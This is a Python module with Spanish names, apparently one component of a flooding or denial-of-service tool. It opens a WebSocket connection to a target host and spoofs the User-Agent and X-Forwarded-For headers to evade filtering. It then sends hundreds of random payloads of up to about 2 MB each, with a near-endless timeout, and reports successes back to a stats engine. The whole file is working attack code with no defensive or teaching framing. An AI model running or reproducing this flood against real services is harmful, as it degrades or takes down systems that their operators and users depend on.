import asyncio
import random
import os
import websockets
from websockets import connect

class WebSocket:
    def __init__(self, motor):
        self.motor = motor
        
    async def ejecutar(self, proxy=None):
        try:
            uri = f"{'wss' if self.motor.ssl else 'ws'}://{self.motor.host}:{self.motor.puerto}/"
            
            async with connect(
                uri,
                extra_headers={
                    "User-Agent": random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
                    ]),
                    "Origin": f"http://{self.motor.host}",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                },
                close_timeout=999999,
                max_size=1024 * 1024 * 100
            ) as websocket:
                for i in range(random.randint(100, 1000)):
                    mensaje = os.urandom(random.randint(1, 1024 * 1024)).hex()
                    await websocket.send(mensaje)
                    await asyncio.sleep(random.uniform(0.001, 0.1))
                    
                self.motor.estadisticas.agregar_exito(1)
                
        except:
            self.motor.estadisticas.agregar_error()